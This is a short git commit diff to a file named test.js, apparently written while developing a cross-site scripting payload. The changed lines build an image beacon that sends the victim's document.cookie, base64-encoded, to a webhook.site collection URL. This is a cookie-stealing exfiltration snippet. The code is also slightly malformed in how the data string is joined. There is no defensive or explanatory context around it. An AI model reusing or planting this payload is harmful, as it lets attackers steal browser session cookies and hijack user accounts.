ff5515f3e0299869944f0619783844ae011d1c77
kali <mike@v-capital.org>
2024-04-21 15:02:49 -0400

    test web hook fix1

--- test.js
+++ test.js
@@ -1,2 +1,2 @@
-x = new Image(); x.src = 'https://webhook.site/#!/view/c877b371-dded-4294-a44a-9c9a1d30480d'
+x = new Image(); x.src = 'https://webhook.site/c877b371-dded-4294-a44a-9c9a1d30480d'
 data='+btoa(document.cookie);
